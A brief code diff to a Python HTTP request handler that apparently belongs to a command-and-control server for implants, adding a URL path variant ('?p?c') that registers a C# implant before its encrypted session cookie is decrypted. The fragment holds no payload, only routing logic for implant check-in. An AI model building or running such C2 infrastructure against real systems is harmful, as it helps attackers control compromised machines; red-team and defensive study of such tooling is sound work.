@@ -147,7 +147,9 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             implant_type = "OSX"
           if s.path == ("%s?c" % new_implant_url):
             implant_type = "C#"
-          
+          if s.path == ("%s?p?c" % new_implant_url):
+            implant_type = "C#"
+                      
           if implant_type == "C#":
             cookieVal = (s.cookieHeader).replace("SessionID=","")
             decCookie = decrypt(KEY, cookieVal)
